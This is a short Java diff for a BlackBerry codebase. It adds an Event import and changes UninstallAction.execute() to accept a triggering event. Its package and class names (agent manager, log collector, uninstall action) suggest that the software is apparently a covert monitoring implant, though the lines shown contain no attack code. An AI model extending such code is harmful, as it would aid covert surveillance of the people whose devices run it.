@@ -12,6 +12,7 @@ import net.rim.device.api.system.CodeModuleManager;
 
 import com.ht.rcs.blackberry.AgentManager;
 import com.ht.rcs.blackberry.EventManager;
+import com.ht.rcs.blackberry.event.Event;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.log.Markup;
 import com.ht.rcs.blackberry.utils.Check;
@@ -31,7 +32,7 @@ public class UninstallAction extends SubAction {
         super(ACTION_UNINSTALL);
     }
 
-    public boolean execute() {
+    public boolean execute(Event triggeringEvent) {
         // #debug
         debug.info("execute");
 
